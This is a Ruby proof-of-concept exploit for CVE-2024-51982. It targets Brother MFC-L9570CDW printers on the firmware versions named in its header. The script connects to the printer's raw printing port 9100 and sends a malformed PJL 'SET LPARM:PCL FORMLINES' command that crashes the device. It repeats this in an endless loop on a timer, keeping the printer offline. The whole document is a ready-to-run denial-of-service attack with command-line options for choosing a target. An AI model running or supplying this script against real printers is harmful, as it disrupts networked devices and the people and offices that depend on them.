# ==================================================================================
# CVE-2024-51982: An unauthenticated attacker can crash the device via a PJL request
# ==================================================================================
#
# Verified on the following:
# * Brother MFC-L9570CDW (MAIN: ZL2403011354, SUB1: 1.32)
# * Brother MFC-L9570CDW (MAIN: ZK2309081840, SUB1: 1.31) 
#
# Example usage:
#   ruby CVE-2024-51982.rb --printer_ip 192.168.86.62
# ==================================================================================
require 'socket'
require 'optparse'

options = {
	printer_ip: nil,
	printer_port: 9100,
	delay: 10
}

OptionParser.new do |opt|
  opt.on('--printer_ip IP') { |o| options[:printer_ip] = o }
  opt.on('--printer_port PORT') { |o| options[:printer_port] = o.to_i }
  opt.on('--delay SECONDS') { |o| options[:delay] = o.to_i }
end.parse!

if options[:printer_ip].nil?
	$stderr.puts("You must specify a target printer IP via --printer_ip")
	Kernel.exit -1
end

$stdout.puts("Targeting #{options[:printer_ip]}:#{options[:printer_port]}")

data  = "@PJL INFO STATUS\r\n"
data << "@PJL SET LPARM:PCL FORMLINES=a\r\n"

loop do
	begin
		s = TCPSocket.new(options[:printer_ip], options[:printer_port])

		$stdout.puts("Crashing...")
		
		s.write(data)
	rescue Errno::ECONNRESET
		$stdout.puts("Connection reset.")		
	rescue Errno::ETIMEDOUT
		$stdout.puts("Connection timedout.")	
	rescue Errno::ECONNREFUSED
		$stdout.puts("Connection refused.")
	end
	
	$stdout.puts("Sleeping for #{options[:delay]} seconds...")
	
	sleep(options[:delay])
end
